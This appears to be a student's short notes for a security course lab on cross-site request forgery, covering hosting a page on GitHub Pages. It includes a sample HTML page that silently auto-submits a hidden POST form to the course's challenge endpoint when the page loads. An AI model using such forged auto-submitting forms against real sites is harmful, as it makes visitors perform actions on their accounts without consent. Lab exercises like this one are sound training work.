Needed to host a webpage for Unit 2's CSRF2 (Stretch Challenge): adding onemethod using github
Needed to make sure to publish the page from settings and pages


Sample HTML Script:

<form name="csrf" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
    <input type="hidden" name="userId" value="YOUR TOKEN">
    <input type="submit">
</form>
Hello World
<script>document.csrf.submit();</script>


***Make sure to change the value to the same CSRF1 ID provided within the challenge. This is unique to me.***
